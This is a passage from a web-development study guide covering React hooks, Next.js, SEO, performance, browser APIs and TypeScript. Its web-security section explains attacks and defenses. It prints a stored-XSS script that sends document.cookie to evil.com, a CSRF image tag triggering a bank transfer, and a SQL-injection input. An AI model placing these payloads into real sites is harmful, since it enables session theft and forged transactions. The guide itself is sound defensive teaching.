}, [userId])  // ← re-runs when userId changes

// ⚠️ Common mistakes:
// 1. Missing dependency → stale closure
useEffect(() => {
    const id = setInterval(() => {
        setCount(count + 1)  // ❌ 'count' is stale!
    }, 1000)
    return () => clearInterval(id)
}, [])  // ❌ missing 'count' in deps

// Fix:
useEffect(() => {
    const id = setInterval(() => {
        setCount(c => c + 1)  // ✅ functional update, no closure issue
    }, 1000)
    return () => clearInterval(id)
}, [])

// 2. Infinite loop:
useEffect(() => {
    setUser({ ...user, lastSeen: Date.now() })
}, [user])  // ❌ changes user → triggers effect → changes user → infinite!

// ── useRef ──
// 1. Access DOM element
const inputRef = useRef(null)
useEffect(() => { inputRef.current.focus() }, [])
<input ref={inputRef} />

// 2. Mutable value that doesn't trigger re-render
const timerId = useRef(null)
const prevValueRef = useRef(undefined)

function startTimer() {
    timerId.current = setInterval(tick, 1000)  // mutate directly, no re-render
}
function stopTimer() {
    clearInterval(timerId.current)
}

// 3. Track previous value:
function usePrevious(value) {
    const ref = useRef(undefined)
    useEffect(() => { ref.current = value })  // update after render
    return ref.current  // returns value from PREVIOUS render
}

// ── useMemo — memoize expensive computation ──
const sortedUsers = useMemo(
    () => [...users].sort((a, b) => a.name.localeCompare(b.name)),
    [users]  // only recompute when users changes
)

// Use when: computation is expensive (filtering/sorting large arrays, heavy math)
// Don't use for: simple computations (overhead > benefit)

// ── useCallback — memoize function reference ──
const handleSubmit = useCallback(async (data) => {
    await api.createUser(data)
    onSuccess()
}, [onSuccess])  // new function only when onSuccess changes

// Use when: passing callback to memoized child component (React.memo)
// Without: new function reference every render → child always re-renders

// ── useReducer — complex state logic ──
const initialState = { users: [], loading: false, error: null }

function reducer(state, action) {
    switch (action.type) {
        case 'FETCH_START':
            return { ...state, loading: true, error: null }
        case 'FETCH_SUCCESS':
            return { ...state, loading: false, users: action.payload }
        case 'FETCH_ERROR':
            return { ...state, loading: false, error: action.payload }
        default:
            return state
    }
}

const [state, dispatch] = useReducer(reducer, initialState)
dispatch({ type: 'FETCH_START' })

// ── useContext — consume context ──
const ThemeContext = createContext('light')

function App() {
    return (
        <ThemeContext.Provider value="dark">
            <Component />
        </ThemeContext.Provider>
    )
}

function Component() {
    const theme = useContext(ThemeContext)  // 'dark'
    return <div className={theme}>...</div>
}

// ── useTransition — non-urgent updates ──
const [isPending, startTransition] = useTransition()

function handleSearch(query) {
    setInputValue(query)  // urgent: update input immediately
    startTransition(() => {
        setSearchResults(expensiveSearch(query))  // non-urgent: can defer
    })
}
// isPending: true while transition is processing

// ── useDeferredValue — defer expensive re-renders ──
const deferredQuery = useDeferredValue(query)  // lags behind query
const results = useMemo(() => expensiveFilter(data, deferredQuery), [deferredQuery])
// Input stays responsive, results update slightly behind
```

## 6.2 React Performance

```jsx
// ── React.memo — prevent unnecessary re-renders ──
const UserCard = React.memo(({ user, onDelete }) => {
    return <div onClick={() => onDelete(user.id)}>{user.name}</div>
})
// Only re-renders if user or onDelete props change

// Custom comparison:
const UserCard = React.memo(({ user }) => {
    return <div>{user.name}</div>
}, (prevProps, nextProps) => {
    return prevProps.user.id === nextProps.user.id  // true = skip re-render
})

// Without React.memo: parent re-renders → ALL children re-render (even unchanged)
// With React.memo: only re-render if props changed (shallow comparison)

// ── Code Splitting & Lazy Loading ──
// Load component only when needed
const Dashboard = React.lazy(() => import('./Dashboard'))
const Settings = React.lazy(() => import('./Settings'))

function App() {
    return (
        <Suspense fallback={<LoadingSpinner />}>
            <Router>
                <Route path="/dashboard" component={Dashboard} />
                <Route path="/settings" component={Settings} />
            </Router>
        </Suspense>
    )
}

// ── Profiler — measure rendering performance ──
<React.Profiler id="UserList" onRender={(id, phase, actualDuration) => {
    console.log(`${id} ${phase}: ${actualDuration}ms`)
}}>
    <UserList users={users} />
</React.Profiler>

// ── Virtualization — render only visible items ──
// For huge lists (1000+ items), render only what's in viewport
import { FixedSizeList } from 'react-window'

function VirtualList({ items }) {
    return (
        <FixedSizeList
            height={600}
            itemCount={items.length}
            itemSize={80}
            width="100%"
        >
            {({ index, style }) => (
                <div style={style} key={items[index].id}>
                    <UserCard user={items[index]} />
                </div>
            )}
        </FixedSizeList>
    )
}

// ── Key reconciliation ──
// Keys must be STABLE, UNIQUE, and based on DATA (not index)
// Good: key={user.id}
// Bad:  key={index} (breaks on reorder/filter)
// Bad:  key={Math.random()} (new key every render = always unmount/remount!)
```

## 6.3 Custom Hooks

```jsx
// Custom hooks: extract and reuse stateful logic

// ── useFetch ──
function useFetch(url) {
    const [data, setData] = useState(null)
    const [loading, setLoading] = useState(true)
    const [error, setError] = useState(null)

    useEffect(() => {
        let cancelled = false          // handle race conditions!
        setLoading(true)
        setError(null)

        fetch(url)
            .then(res => {
                if (!res.ok) throw new Error(`HTTP ${res.status}`)
                return res.json()
            })
            .then(data => {
                if (!cancelled) setData(data)  // don't update if unmounted
            })
            .catch(err => {
                if (!cancelled) setError(err.message)
            })
            .finally(() => {
                if (!cancelled) setLoading(false)
            })

        return () => { cancelled = true }  // cleanup on unmount or url change
    }, [url])

    return { data, loading, error }
}

// Usage:
function UserProfile({ id }) {
    const { data: user, loading, error } = useFetch(`/api/users/${id}`)
    if (loading) return <Skeleton />
    if (error) return <Error message={error} />
    return <div>{user.name}</div>
}

// ── useLocalStorage ──
function useLocalStorage(key, initialValue) {
    const [value, setValue] = useState(() => {
        try {
            const item = localStorage.getItem(key)
            return item ? JSON.parse(item) : initialValue
        } catch {
            return initialValue
        }
    })

    const set = useCallback((newValue) => {
        try {
            const valueToStore = newValue instanceof Function
                ? newValue(value)
                : newValue
            setValue(valueToStore)
            localStorage.setItem(key, JSON.stringify(valueToStore))
        } catch (error) {
            console.error(error)
        }
    }, [key, value])

    return [value, set]
}

// ── useDebounce ──
function useDebounce(value, delay) {
    const [debouncedValue, setDebouncedValue] = useState(value)

    useEffect(() => {
        const timer = setTimeout(() => setDebouncedValue(value), delay)
        return () => clearTimeout(timer)
    }, [value, delay])

    return debouncedValue
}

// Usage:
function Search() {
    const [query, setQuery] = useState('')
    const debouncedQuery = useDebounce(query, 300)
    const { data } = useFetch(`/api/search?q=${debouncedQuery}`)
    // API only called 300ms after user stops typing
}
```

---

# 7. Next.js — Full Stack React

> 📖 <https://nextjs.org/docs>

## 7.1 Rendering Strategies

```
NEXT.JS RENDERING MODES:

SSG (Static Site Generation) — at BUILD TIME:
  HTML generated once during build
  Served from CDN
  ✅ Fastest (pre-built HTML)
  ✅ SEO excellent
  ❌ Stale data until rebuild
  Use: blog posts, docs, marketing pages

ISR (Incremental Static Regeneration) — background re-generation:
  Start with static, regenerate in background after TTL
  Users always get fast static response
  Stale-while-revalidate: first request after TTL → serve stale, rebuild in background
  ✅ Fast + fresh-ish data
  Use: product pages, news articles, prices

SSR (Server-Side Rendering) — per REQUEST:
  HTML generated on server for every request
  Fresh data always
  ✅ Always up-to-date, SEO good
  ❌ Slower (server renders each request)
  Use: personalized pages, auth-dependent content

CSR (Client-Side Rendering) — in BROWSER:
  Shell HTML sent, JS fetches data and renders
  ❌ SEO poor (content not in initial HTML)
  ✅ Rich interactivity
  Use: dashboards, apps requiring real-time updates

React Server Components (RSC) — Next.js 13+ App Router:
  Components that run on server, 0 JS sent to client
  Can directly query DB, access secrets
  ✅ No hydration cost
  ✅ Smaller JS bundle
  ✅ Auto code-splitting
```

## 7.2 App Router (Next.js 13+)

```
app/
├── layout.tsx          ← Root layout (persistent across routes)
├── page.tsx            ← Home page (/)
├── loading.tsx         ← Automatic Suspense fallback
├── error.tsx           ← Error boundary
├── not-found.tsx       ← 404 page
├── globals.css
├── users/
│   ├── page.tsx        ← /users
│   ├── layout.tsx      ← Persistent layout for /users/*
│   └── [id]/
│       ├── page.tsx    ← /users/123 (dynamic route)
│       └── edit/
│           └── page.tsx ← /users/123/edit
├── api/
│   └── users/
│       ├── route.ts    ← GET/POST /api/users
│       └── [id]/
│           └── route.ts ← GET/PUT/DELETE /api/users/123
└── (auth)/             ← Route group (no URL segment)
    ├── login/page.tsx
    └── register/page.tsx
```

```tsx
// Server Component (default in App Router)
// Runs on server — can access DB directly, no 'use client'
async function UserList() {
    // Direct DB query — no API needed!
    const users = await prisma.user.findMany()
    // OR: const res = await fetch('https://...', { cache: 'no-store' })

    return (
        <ul>
            {users.map(user => (
                <UserCard key={user.id} user={user} />
            ))}
        </ul>
    )
}

// Client Component — needs interactivity, browser APIs
'use client'  // ← must be first line

import { useState } from 'react'

function Counter() {
    const [count, setCount] = useState(0)
    return <button onClick={() => setCount(c => c + 1)}>{count}</button>
}

// Fetch with caching options:
const data = await fetch(url)                              // cached (SSG)
const data = await fetch(url, { cache: 'no-store' })      // no cache (SSR)
const data = await fetch(url, { next: { revalidate: 60 }}) // ISR, 60s TTL
const data = await fetch(url, { next: { tags: ['users'] }}) // cache tag

// Route Handler (API)
// app/api/users/route.ts
export async function GET(request: Request) {
    const { searchParams } = new URL(request.url)
    const page = parseInt(searchParams.get('page') || '1')
    const users = await prisma.user.findMany({ skip: (page-1)*20, take: 20 })
    return Response.json(users)
}

export async function POST(request: Request) {
    const body = await request.json()
    const user = await prisma.user.create({ data: body })
    return Response.json(user, { status: 201 })
}

// Dynamic route params:
// app/users/[id]/page.tsx
export default async function UserPage({ params }: { params: { id: string }}) {
    const user = await prisma.user.findUnique({ where: { id: params.id } })
    if (!user) notFound()  // triggers not-found.tsx
    return <UserProfile user={user} />
}

// generateStaticParams — pre-render dynamic routes at build time
export async function generateStaticParams() {
    const users = await prisma.user.findMany({ select: { id: true } })
    return users.map(u => ({ id: u.id.toString() }))
}
```

## 7.3 Next.js Performance Features

```tsx
// Image optimization
import Image from 'next/image'

<Image
    src="/hero.webp"
    alt="Hero image"
    width={1200}
    height={600}
    priority           // preload (above-fold images)
    placeholder="blur" // show blur while loading
    blurDataURL="data:image/jpeg;base64,..."
    sizes="(max-width: 768px) 100vw, 50vw"  // responsive
/>
// Next/Image: auto WebP/AVIF conversion, lazy loading, prevents CLS

// Font optimization
import { Inter, Noto_Sans } from 'next/font/google'

const inter = Inter({
    subsets: ['latin'],
    display: 'swap',    // FOUT instead of FOIT
    variable: '--font-inter'  // CSS variable
})

export default function RootLayout({ children }) {
    return (
        <html lang="en" className={inter.variable}>
            <body>{children}</body>
        </html>
    )
}
// Next/Font: self-hosted, no request to Google, no FOUT, preloaded

// Link prefetching
import Link from 'next/link'

<Link href="/dashboard" prefetch={true}>  // prefetch on hover (default)
    Dashboard
</Link>

// Parallel routes
app/
├── @dashboard/page.tsx    ← slot
├── @analytics/page.tsx    ← slot
└── layout.tsx             ← receives both slots

export default function Layout({ dashboard, analytics }) {
    return (
        <div>
            {dashboard}
            {analytics}
        </div>
    )
}

// Intercepting routes (modal patterns)
app/
├── photos/[id]/page.tsx   ← full page
└── @modal/
    └── (.)photos/[id]/page.tsx  ← intercept, show as modal
```

---

# 8. SEO — Search Engine Optimization

> 📖 <https://developers.google.com/search/docs>

## 8.1 Technical SEO Fundamentals

```html
<!-- ── META TAGS ── -->
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Best Laptop 2025 — TechReviews</title>  <!-- 50-60 chars -->
    <meta name="description" content="Compare the best laptops of 2025...">  <!-- 150-160 chars -->
    <meta name="robots" content="index, follow">
    <link rel="canonical" href="https://example.com/best-laptops-2025">

    <!-- Open Graph (Facebook, LinkedIn, etc.) -->
    <meta property="og:type" content="article">
    <meta property="og:title" content="Best Laptops 2025">
    <meta property="og:description" content="...">
    <meta property="og:image" content="https://example.com/og-image.jpg">
    <!-- OG image: 1200×630px, < 1MB -->
    <meta property="og:url" content="https://example.com/best-laptops-2025">
    <meta property="og:site_name" content="TechReviews">

    <!-- Twitter Card -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:site" content="@techreviews">
    <meta name="twitter:title" content="Best Laptops 2025">
    <meta name="twitter:description" content="...">
    <meta name="twitter:image" content="https://example.com/twitter-card.jpg">

    <!-- Alternate languages -->
    <link rel="alternate" hreflang="en" href="https://example.com/en/page">
    <link rel="alternate" hreflang="vi" href="https://example.com/vi/page">
    <link rel="alternate" hreflang="x-default" href="https://example.com/page">
</head>

<!-- ── SEMANTIC HTML (critical for SEO!) ── -->
<body>
    <header>
        <nav aria-label="Main navigation">
            <ul>
                <li><a href="/">Home</a></li>
                <li><a href="/products">Products</a></li>
            </ul>
        </nav>
    </header>

    <main>
        <article>
            <header>
                <h1>Best Laptops of 2025</h1>    <!-- Only 1 H1 per page! -->
                <p>Published: <time datetime="2025-05-19">May 19, 2025</time></p>
                <address>By <a href="/authors/khang">Khang</a></address>
            </header>

            <section>
                <h2>For Students</h2>       <!-- H2 for main sections -->
                <h3>MacBook Air M3</h3>     <!-- H3 for subsections -->
                <p>...</p>
                <figure>
                    <img src="macbook.webp"
                         alt="MacBook Air M3 on a desk showing terminal"
                         width="800" height="450"
                         loading="lazy">   <!-- lazy for below-fold -->
                    <figcaption>MacBook Air M3 — perfect for developers</figcaption>
                </figure>
            </section>
        </article>

        <aside>
            <h2>Related Articles</h2>
            <!-- ... -->
        </aside>
    </main>

    <footer>
        <!-- ... -->
    </footer>
</body>
```

## 8.2 Structured Data (Schema.org)

```html
<!-- JSON-LD (recommended by Google) -->
<script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "headline": "Best Laptops of 2025",
    "description": "Compare the best laptops...",
    "image": "https://example.com/laptop.jpg",
    "author": {
        "@type": "Person",
        "name": "Khang",
        "url": "https://example.com/authors/khang"
    },
    "publisher": {
        "@type": "Organization",
        "name": "TechReviews",
        "logo": {
            "@type": "ImageObject",
            "url": "https://example.com/logo.png"
        }
    },
    "datePublished": "2025-05-19",
    "dateModified": "2025-05-19"
}
</script>

<!-- Product Schema -->
<script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Product",
    "name": "MacBook Air M3",
    "image": "https://example.com/macbook.jpg",
    "description": "Apple MacBook Air with M3 chip",
    "brand": { "@type": "Brand", "name": "Apple" },
    "offers": {
        "@type": "Offer",
        "priceCurrency": "USD",
        "price": "1099",
        "availability": "https://schema.org/InStock",
        "url": "https://example.com/macbook-air-m3"
    },
    "aggregateRating": {
        "@type": "AggregateRating",
        "ratingValue": "4.8",
        "reviewCount": "1247"
    }
}
</script>

<!-- FAQ Schema (gets rich snippets in search) -->
<script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "FAQPage",
    "mainEntity": [
        {
            "@type": "Question",
            "name": "What is the best laptop for programming?",
            "acceptedAnswer": {
                "@type": "Answer",
                "text": "MacBook Pro M3 is excellent for programming due to..."
            }
        }
    ]
}
</script>
```

## 8.3 Core Web Vitals

```
Google's metrics for page experience (ranking factor):

LCP (Largest Contentful Paint) — Loading performance
  Measures: when largest content element is rendered
  Good: < 2.5 seconds
  Poor: > 4 seconds
  Common causes: slow server, render-blocking resources, slow images
  Fix: preload hero image, optimize server response, use CDN

FID (First Input Delay) → replaced by INP (Interaction to Next Paint) 2024
INP (Interaction to Next Paint) — Interactivity
  Measures: latency of worst interaction (click, tap, keyboard)
  Good: < 200ms
  Poor: > 500ms
  Causes: heavy JavaScript blocking main thread
  Fix: code splitting, web workers, reduce JS execution time

CLS (Cumulative Layout Shift) — Visual stability
  Measures: unexpected layout shifts (content jumping around)
  Good: < 0.1
  Poor: > 0.25
  Causes: images without width/height, ads loading, late font loading
  Fix: always set width/height on images/video, reserve space for ads

TTFB (Time to First Byte) — Server responsiveness
  Good: < 800ms
  Fix: CDN, server optimization, edge computing

FCP (First Contentful Paint)
  First text or image painted
  Good: < 1.8s

Measuring:
  Chrome DevTools → Lighthouse tab
  PageSpeed Insights: https://pagespeed.web.dev/
  Web Vitals extension
  Real User Monitoring (RUM): web-vitals JS library

import { onCLS, onFID, onFCP, onLCP, onTTFB } from 'web-vitals'
onLCP(console.log)
onCLS(console.log)
onFID(console.log)
```

## 8.4 Next.js SEO — Metadata API

```tsx
// app/layout.tsx — default metadata
import type { Metadata } from 'next'

export const metadata: Metadata = {
    title: {
        template: '%s | TechReviews',    // page title | site name
        default: 'TechReviews'
    },
    description: 'Best tech reviews and comparisons',
    keywords: ['laptop', 'review', 'tech'],
    authors: [{ name: 'Khang', url: 'https://khang.dev' }],
    robots: {
        index: true,
        follow: true,
        googleBot: { index: true, follow: true }
    },
    openGraph: {
        type: 'website',
        locale: 'en_US',
        url: 'https://techreviews.com',
        siteName: 'TechReviews',
    },
    twitter: {
        card: 'summary_large_image',
        site: '@techreviews',
    }
}

// app/products/[id]/page.tsx — dynamic metadata per page
export async function generateMetadata(
    { params }: { params: { id: string } }
): Promise<Metadata> {
    const product = await fetchProduct(params.id)

    return {
        title: product.name,        // → "MacBook Air M3 | TechReviews"
        description: product.summary,
        openGraph: {
            title: product.name,
            description: product.summary,
            images: [{ url: product.imageUrl, width: 1200, height: 630 }]
        }
    }
}

// Sitemap — app/sitemap.ts
export default async function sitemap() {
    const products = await fetchProducts()
    return [
        { url: 'https://example.com', lastModified: new Date() },
        ...products.map(p => ({
            url: `https://example.com/products/${p.id}`,
            lastModified: p.updatedAt,
            changeFrequency: 'weekly' as const,
            priority: 0.8
        }))
    ]
}

// Robots.txt — app/robots.ts
export default function robots() {
    return {
        rules: [
            { userAgent: '*', allow: '/', disallow: ['/admin', '/api'] }
        ],
        sitemap: 'https://example.com/sitemap.xml'
    }
}
```

---

# 9. Web Performance Optimization

## 9.1 JavaScript Optimization

```javascript
// ── DEBOUNCE — wait until user stops ──
function debounce(fn, delay) {
    let timer
    return function(...args) {
        clearTimeout(timer)
        timer = setTimeout(() => fn.apply(this, args), delay)
    }
}

const searchInput = document.querySelector('#search')
searchInput.addEventListener('input', debounce((e) => {
    fetchResults(e.target.value)
}, 300))  // API call only after 300ms of inactivity

// ── THROTTLE — limit rate ──
function throttle(fn, limit) {
    let inThrottle
    return function(...args) {
        if (!inThrottle) {
            fn.apply(this, args)
            inThrottle = true
            setTimeout(() => inThrottle = false, limit)
        }
    }
}

window.addEventListener('scroll', throttle(updateProgress, 16))  // max 60fps

// ── WEB WORKERS — offload heavy computation ──
// Main thread (never block this!):
const worker = new Worker('/heavy-computation.worker.js')
worker.postMessage({ data: largeArray })
worker.onmessage = (e) => {
    renderResults(e.data.result)  // back on main thread after work done
}

// heavy-computation.worker.js (runs in separate thread):
self.onmessage = (e) => {
    const result = expensiveSort(e.data.data)  // doesn't block UI!
    self.postMessage({ result })
}

// ── MEMOIZATION ──
function memoize(fn) {
    const cache = new Map()
    return function(...args) {
        const key = JSON.stringify(args)
        if (cache.has(key)) return cache.get(key)
        const result = fn.apply(this, args)
        cache.set(key, result)
        return result
    }
}

const fib = memoize(function(n) {
    if (n <= 1) return n
    return fib(n - 1) + fib(n - 2)
})
```

## 9.2 Image Optimization

```html
<!-- Modern image formats -->
<picture>
    <source srcset="image.avif" type="image/avif">  <!-- best compression -->
    <source srcset="image.webp" type="image/webp">  <!-- wide support -->
    <img src="image.jpg" alt="..." loading="lazy" decoding="async"
         width="800" height="450">  <!-- ALWAYS set dimensions → prevents CLS! -->
</picture>

<!-- Responsive images -->
<img
    srcset="
        image-400.webp  400w,
        image-800.webp  800w,
        image-1200.webp 1200w
    "
    sizes="
        (max-width: 600px)  100vw,
        (max-width: 1200px) 50vw,
        33vw
    "
    src="image-800.webp"
    alt="..."
    loading="lazy"
>

<!-- Priority hints -->
<img src="hero.jpg" fetchpriority="high" alt="...">  <!-- LCP image: high priority -->
<img src="offscreen.jpg" fetchpriority="low" alt="...">

<!-- CSS background image lazy load with IntersectionObserver -->
<!-- Instead of: background-image in CSS (always loads) -->
<!-- Use: data-bg and JS to set when in viewport -->
```

## 9.3 Bundle Optimization

```javascript
// webpack.config.js / next.config.js

// Code splitting — load chunks on demand
// Dynamic import:
const HeavyChart = dynamic(() => import('./HeavyChart'), {
    loading: () => <Skeleton />,
    ssr: false  // don't render on server (D3, Chart.js etc.)
})

// Tree shaking — remove unused code
// ✅ Named imports allow tree shaking:
import { debounce } from 'lodash-es'  // only import what's used
// ❌ Default import = entire library:
import _ from 'lodash'  // all of lodash bundled!

// Bundle analysis:
// npx @next/bundle-analyzer
// Identifies large dependencies to replace/split

// Compression:
// Brotli > gzip (better compression, modern browsers support it)
// nginx: brotli on; brotli_comp_level 6;

// HTTP/2 Server Push / 103 Early Hints:
// Send resources before HTML fully processed
// Link: </style.css>; rel=preload; as=style
```

---

# 10. Web Security

## 10.1 XSS — Cross-Site Scripting

```javascript
// ── STORED XSS ──
// Attacker stores malicious script in DB
// victim.com stores: <script>fetch('evil.com?c='+document.cookie)</script>
// Other users view page → script executes → cookies stolen!

// Prevention:
// 1. Escape output (HTML entity encoding)
function escapeHtml(str) {
    const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;',
                  '"': '&quot;', "'": '&#39;' }
    return str.replace(/[&<>"']/g, m => map[m])
}
// Never: element.innerHTML = userInput
// Always: element.textContent = userInput  (auto-escaped!)

// 2. Content Security Policy
// HTTP header:
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'; img-src 'self' data:; style-src 'self' 'unsafe-inline'
// Blocks inline scripts, only allows scripts from same origin
// nonce: random value per request, inline scripts need to match

// 3. DOMPurify for rich text (HTML that users can write):
import DOMPurify from 'dompurify'
element.innerHTML = DOMPurify.sanitize(userHtmlInput)

// ── REFLECTED XSS ──
// Malicious script in URL, reflected back in response
// https://victim.com/search?q=<script>...</script>
// Page renders: <p>Results for <script>...</script></p>

// ── DOM-BASED XSS ──
// Script uses URL/DOM data without sanitization
const query = new URLSearchParams(location.search).get('q')
document.getElementById('output').innerHTML = query  // ❌ XSS!
document.getElementById('output').textContent = query  // ✅ safe
```

## 10.2 CSRF, Clickjacking, and More

```
CSRF (Cross-Site Request Forgery):
  User logged into bank.com
  Visits evil.com which has: <img src="https://bank.com/transfer?to=attacker&amount=10000">
  Browser sends request WITH bank.com cookies → transfer happens!

  Prevention:
    CSRF tokens: random token in form, validate server-side
    SameSite cookie: Set-Cookie: session=abc; SameSite=Strict
      Strict: cookie never sent cross-site
      Lax: cookie sent for top-level navigation (default modern browsers)
      None: always sent (requires Secure)
    Check Origin/Referer header

CLICKJACKING:
  Attacker overlays transparent iframe of victim site
  User clicks "win prize" button → actually clicks "confirm payment"

  Prevention:
    X-Frame-Options: DENY  (don't allow any framing)
    X-Frame-Options: SAMEORIGIN
    CSP: frame-ancestors 'self'

CORS (already covered in networking):
  Server must explicitly allow cross-origin requests
  Access-Control-Allow-Origin: https://myapp.com

HTTPS:
  All cookies should have Secure flag
  Set-Cookie: session=abc; Secure; HttpOnly; SameSite=Strict
    Secure: only sent over HTTPS
    HttpOnly: not accessible via JavaScript (prevents XSS cookie theft!)
    SameSite: CSRF protection

SQL INJECTION (web context):
  Never concatenate user input into SQL
  Always use parameterized queries / ORM
  Input: ' OR '1'='1
  Vulnerable: SELECT * FROM users WHERE name = '' OR '1'='1'
```

---

# 11. Modern Web APIs

## 11.1 Fetch & Streams

```javascript
// ── FETCH API ──
const response = await fetch('/api/data', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${token}`
    },
    body: JSON.stringify({ key: 'value' }),
    signal: AbortController.signal,  // cancellable request!
    credentials: 'include',  // send cookies cross-origin
    mode: 'cors',
    cache: 'no-store'
})

if (!response.ok) throw new Error(`HTTP ${response.status}`)

const json = await response.json()
const text = await response.text()
const blob = await response.blob()   // for files/images
const formData = await response.formData()

// AbortController — cancel requests
const controller = new AbortController()
setTimeout(() => controller.abort(), 5000)  // 5s timeout

try {
    const res = await fetch('/api/slow', { signal: controller.signal })
} catch (e) {
    if (e.name === 'AbortError') console.log('Request cancelled')
}

// Streaming response (for AI/LLM responses, large files):
const response = await fetch('/api/stream')
const reader = response.body.getReader()
const decoder = new TextDecoder()

while (true) {
    const { done, value } = await reader.read()
    if (done) break
    const chunk = decoder.decode(value, { stream: true })
    appendToOutput(chunk)   // show text as it arrives!
}

// ── SERVER-SENT EVENTS ──
const eventSource = new EventSource('/api/events')
eventSource.onmessage = (e) => updateUI(JSON.parse(e.data))
eventSource.onerror = (e) => { eventSource.close() }

// ── WEBSOCKET ──
const ws = new WebSocket('wss://api.example.com/ws')
ws.onopen = () => ws.send(JSON.stringify({ type: 'subscribe' }))
ws.onmessage = (e) => handleMessage(JSON.parse(e.data))
ws.onclose = (e) => reconnect()
ws.onerror = console.error
```

## 11.2 Storage APIs

```javascript
// ── LOCAL STORAGE — simple key-value, persistent ──
localStorage.setItem('theme', 'dark')
localStorage.getItem('theme')           // 'dark' or null
localStorage.removeItem('theme')
localStorage.clear()                    // remove all

// Size: ~5-10MB, synchronous (blocks thread!), strings only
// Not available in SSR (window is undefined on server!)

// ── SESSION STORAGE — like localStorage but clears on tab close ──
sessionStorage.setItem('formDraft', JSON.stringify(formData))

// ── INDEXEDDB — structured data, large amounts ──
const db = await new Promise((resolve, reject) => {
    const req = indexedDB.open('myDB', 1)
    req.onupgradeneeded = (e) => {
        const db = e.target.result
        const store = db.createObjectStore('users', { keyPath: 'id' })
        store.createIndex('email', 'email', { unique: true })
    }
    req.onsuccess = (e) => resolve(e.target.result)
    req.onerror = (e) => reject(e.target.error)
})

// Or with a library (much easier):
import { openDB } from 'idb'
const db = await openDB('myDB', 1, {
    upgrade(db) {
        db.createObjectStore('users', { keyPath: 'id' })
    }
})

await db.add('users', { id: 1, name: 'Khang', email: 'k@test.com' })
const user = await db.get('users', 1)
const all = await db.getAll('users')
await db.delete('users', 1)
// Great for: offline apps, large datasets, cache API responses

// ── COOKIES ──
document.cookie = 'theme=dark; max-age=86400; path=/; SameSite=Lax'
// Reading:
const cookies = Object.fromEntries(
    document.cookie.split('; ').map(c => c.split('='))
)
// HttpOnly cookies: NOT accessible via JS (server-set, more secure)
// Use js-cookie library for easier manipulation
```

## 11.3 Service Workers & PWA

```javascript
// Service Worker: runs in background, intercepts network requests
// Enables: offline support, background sync, push notifications

// Register:
if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('/sw.js')
}

// sw.js:
const CACHE_NAME = 'v1'
const PRECACHE = ['/index.html', '/styles.css', '/app.js', '/offline.html']

self.addEventListener('install', (e) => {
    e.waitUntil(
        caches.open(CACHE_NAME).then(cache => cache.addAll(PRECACHE))
    )
})

self.addEventListener('activate', (e) => {
    // Clean up old caches
    e.waitUntil(
        caches.keys().then(keys => Promise.all(
            keys.filter(k => k !== CACHE_NAME).map(k => caches.delete(k))
        ))
    )
})

self.addEventListener('fetch', (e) => {
    e.respondWith(
        // Network first, fall back to cache:
        fetch(e.request)
            .then(response => {
                const clone = response.clone()
                caches.open(CACHE_NAME).then(cache => cache.put(e.request, clone))
                return response
            })
            .catch(() => caches.match(e.request) || caches.match('/offline.html'))
    )
})

// PWA manifest:
// public/manifest.json
{
    "name": "My App",
    "short_name": "App",
    "start_url": "/",
    "display": "standalone",
    "background_color": "#ffffff",
    "theme_color": "#3B82F6",
    "icons": [
        { "src": "/icon-192.png", "sizes": "192x192", "type": "image/png" },
        { "src": "/icon-512.png", "sizes": "512x512", "type": "image/png" }
    ]
}
```

---

# 12. TypeScript Essentials

> 📖 <https://www.typescriptlang.org/docs/>

## 12.1 Type System

```typescript
// ── BASIC TYPES ──
let name: string = 'Khang'
let age: number = 21
let active: boolean = true
let nothing: null = null
let undef: undefined = undefined
let anything: any = 'anything'  // avoid! disables type checking
let unknown: unknown = 'safer'  // must narrow before use

// Arrays
let nums: number[] = [1, 2, 3]
let strs: Array<string> = ['a', 'b']
let tuples: [string, number] = ['khang', 21]  // fixed-length, typed positions

// Union types
let id: string | number = '123'
id = 456  // also valid

// Literal types
type Direction = 'north' | 'south' | 'east' | 'west'
type StatusCode = 200 | 201 | 400 | 404 | 500

// ── INTERFACES & TYPES ──
interface User {
    id: number
    name: string
    email: string
    role: 'admin' | 'user' | 'moderator'
    age?: number               // optional
    readonly createdAt: Date   // immutable
    address?: {
        street: string
        city: string
    }
}

type Point = { x: number; y: number }
type Point3D = Point & { z: number }  // intersection type

// Interface vs Type:
// Interface: extendable (can be extended/merged), prefer for objects/classes
// Type: more flexible (unions, intersections, tuples, mapped types)
// Both work for objects — use interface for public API, type for complex types

// ── GENERICS ──
function identity<T>(arg: T): T { return arg }
const result = identity<string>('hello')  // T = string

// Generic constraints:
function getProperty<T, K extends keyof T>(obj: T, key: K): T[K] {
    return obj[key]
}
getProperty({ name: 'Khang', age: 21 }, 'name')  // ✅
getProperty({ name: 'Khang', age: 21 }, 'email')  // ❌ compile error

// Generic interface:
interface ApiResponse<T> {
    data: T
    error: string | null
    status: number
}
type UserResponse = ApiResponse<User>
type ListResponse<T> = ApiResponse<T[]> & { total: number; page: number }

// ── UTILITY TYPES ──
interface User { id: number; name: string; email: string; password: string }

type PartialUser = Partial<User>              // all fields optional
type RequiredUser = Required<PartialUser>     // all fields required
type ReadonlyUser = Readonly<User>            // all fields readonly

type PublicUser = Omit<User, 'password'>     // exclude password
type Credentials = Pick<User, 'email' | 'password'>  // only these fields

type UserKeys = keyof User                   // 'id' | 'name' | 'email' | 'password'
type UserValues = User[keyof User]           // number | string

type StringRecord = Record<string, string>   // { [key: string]: string }
type UserMap = Record<number, User>          // { [id: number]: User }

type NonNullableEmail = NonNullable<string | null | undefined>  // string

// Extract/Exclude:
type Fruits = 'apple' | 'banana' | 'orange'
type YellowFruits = Extract<Fruits, 'banana' | 'pear'>  // 'banana'
type NotBanana = Exclude<Fruits, 'banana'>               // 'apple' | 'orange'

// ReturnType, Parameters:
function fetchUser(id: number): Promise<User> { ... }
type FetchReturn = ReturnType<typeof fetchUser>      // Promise<User>
type FetchParams = Parameters<typeof fetchUser>      // [id: number]

